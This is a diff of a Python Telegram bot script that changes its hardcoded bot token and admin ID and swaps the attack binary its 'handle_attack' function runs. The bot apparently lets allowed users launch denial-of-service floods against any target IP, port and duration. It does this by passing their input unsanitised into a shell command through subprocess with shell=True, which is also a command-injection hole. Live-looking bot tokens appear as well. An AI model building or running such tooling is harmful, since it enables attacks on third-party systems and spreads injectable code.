@@ -4,10 +4,10 @@ import datetime
 import os
 
 # Insert your Telegram bot token here
-bot = telebot.TeleBot('7380126811:AAGXDmWjnMpwUaxVUeqwX9K1nofPNpAq4T4')
+bot = telebot.TeleBot('7543476314:AAEoVDg8sTNXcaX1j4FvEFzh5fFzySRj8T4')
 
 # Admin user IDs
-admin_id = {"1721730214"}
+admin_id = {"6470028996"}
 
 # File to store allowed user IDs
 USER_FILE = "users.txt"
@@ -300,7 +300,7 @@ def handle_attack(message):
                     start_attack_reply(message, target, port, time)
 
                     # Simulate attack process
-                    full_command = f"./gyrange {target} {port} {time}"
+                    full_command = f"./SPIDY {target} {port} {time}"
                     subprocess.run(full_command, shell=True)
 
                     response = "Chudai completed successfully."
